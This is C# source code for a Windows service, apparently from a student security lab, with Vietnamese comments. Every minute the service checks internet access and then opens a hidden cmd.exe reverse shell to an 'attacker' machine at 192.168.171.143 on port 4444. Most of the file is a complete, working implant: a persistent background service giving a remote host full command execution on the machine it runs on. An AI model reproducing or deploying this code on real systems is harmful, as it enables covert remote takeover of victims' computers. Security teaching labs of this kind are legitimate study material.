using System;
using System.Diagnostics;
using System.IO;
using System.ServiceProcess;
using System.Text;
using System.Timers;
using System.Net.Http;
using System.Net.Sockets;

namespace Lab2_Bai3
{
    public partial class Service1 : ServiceBase
    {
        Timer timer = new Timer(); // name space(using System.Timers;)
        public Service1()
        {
            InitializeComponent();
        }

        protected override void OnStart(string[] args)
        {
            WriteToFile("Service is started at " + DateTime.Now);
            timer.Elapsed += new ElapsedEventHandler(OnElapsedTime);
            timer.Interval = 60000; //number in miliseconds 60s
            timer.Enabled = true;
        }

        protected override void OnStop()
        {
            WriteToFile("Service is stopped at " + DateTime.Now);
        }

        private void OnElapsedTime(object source, ElapsedEventArgs e)
        {
            WriteToFile("Service is recall at " + DateTime.Now);
            CheckInternetConnection();
        }

        public void WriteToFile(string Message)
        {
            string path = AppDomain.CurrentDomain.BaseDirectory + "\\Logs";
            if (!Directory.Exists(path))
            {
                Directory.CreateDirectory(path);
            }
            string filepath = AppDomain.CurrentDomain.BaseDirectory + "\\Logs\\ServiceLog_" +
            DateTime.Now.Date.ToShortDateString().Replace('/', '_') + ".txt";
            if (!File.Exists(filepath))
            {
                // Create a file to write to.
                using (StreamWriter sw = File.CreateText(filepath))
                {
                    sw.WriteLine(Message);
                }
            }
            else
            {
                using (StreamWriter sw = File.AppendText(filepath))
                {
                    sw.WriteLine(Message);
                }
            }
        }

        //Hàm kiểm tra kết nối internet của máy hiện tại (HTTP)
        public async void CheckInternetConnection()
        {
            string url = "http://www.google.com/";
            // Khởi tạo http client
            HttpClient clientHttp = new HttpClient();
            try
            {
                //Gửi request Get HTTP tới google
                HttpResponseMessage response = await clientHttp.GetAsync(url);
                WriteToFile("Internet Access  " + DateTime.Now);

                // nếu có internet sẽ thực hiện reverse shell
                WriteToFile("Create reverse shell  " + DateTime.Now);
                ReverseShell();
            }
            catch 
            {
                //Ghi log nếu không có internet tức không thể kết nối tới www.google.com
                WriteToFile("No Internet Access  " + DateTime.Now);
            }
        }

        static StreamWriter sWriter;
        // Hàm tạo reverse shell với nạn nhân là máy hiện tại
        public void ReverseShell()
        {
            /* Khai báo */
            // Kết nối tới máy attacker IP 192.168.171.143 đang lắng nghe trên port 4444
            TcpClient client = new TcpClient("192.168.171.143", 4444);
            Stream stream = client.GetStream();
            StreamReader sReader = new StreamReader(stream);
            sWriter = new StreamWriter(stream);
            StringBuilder strInput = new StringBuilder();

            //Tạo process cmd.exe và khởi tạo các Property
            Process process = new Process();
            process.StartInfo.FileName = "cmd.exe";
            process.StartInfo.CreateNoWindow = true;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.RedirectStandardInput = true;
            process.StartInfo.RedirectStandardError = true;
            process.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
            
            //Thực thi
            process.Start();
            process.BeginOutputReadLine();

            while (true)
            {
                strInput.Append(sReader.ReadLine());
                process.StandardInput.WriteLine(strInput);
                strInput.Remove(0, strInput.Length);
            }
        }

        //Hàm hiển thị output của cmd.exe lên console của attacker
        private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                strOutput.Append(outLine.Data);
                sWriter.WriteLine(strOutput);
                sWriter.Flush();
            }
        }

    }
}
